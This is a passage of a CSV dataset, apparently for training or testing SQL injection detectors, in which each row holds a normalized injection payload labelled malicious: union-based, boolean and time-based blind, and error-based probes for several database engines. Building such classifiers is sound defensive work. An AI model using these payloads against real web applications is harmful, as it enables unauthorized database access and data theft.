row_index,payload_norm,label,sqli_type_hint
1980,"-1641'|| ( select 'jfnu' where 7682 = 7682 union all select 7682,7682,7682--",1,
1981,1' in boolean mode ) waitfor delay '0:0:5'#,1,
1982,1' where 1623 = 1623,1,
1983,1 where 2060 = 2060,1,
1984,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,
1985,"1 ) ) as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--",1,
1986,"1%' union all select null,null,null,null,null,null,null,null,null--",1,
1987,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pnpx' = 'pnpx,1,
1988,-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,1,
1989,"1%' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
1990,select pg_sleep ( 5 ) and ( 'aydg' = 'aydg,1,
1991,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",1,
1992,-2869' ) ) union all select 3216--,1,
1993,1' ) ) as xqvq where 4816 = 4816 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
1994,1' ) where 8429 = 8429,1,
1995,"1 ) as oblq where 2002 = 2002 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
1996,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'nepn' = 'nepn",1,
1997,1'+ ( select 'qylf' where 6984 = 6984 and 2255 = 5094,1,
1998,"-2131"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""wpsf"" like ""wpsf",1,
1999,"-3885 ) where 2387 = 2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1,
2000,"1"" ) ) as hwlh where 1071 = 1071 union all select null,null,null,null,null,null,null,null#",1,
2001,"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
2002,"1 ) ) as aeat where 1007 = 1007 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2003,"1'+ ( select 'igoi' where 7823 = 7823 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",1,
2004,"1' ) and elt ( 4249 = 4249,7259 )",1,
2005,1' in boolean mode ) and 5981 = 6700,1,
2006,1'+ ( select echl where 6593 = 6593 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
2007,"1%"" ) ) rlike sleep ( 5 ) #",1,
2008,"-8369"" ) ) union all select 2191--",1,
2009,"1' ) ) ) union all select null,null,null,null,null#",1,
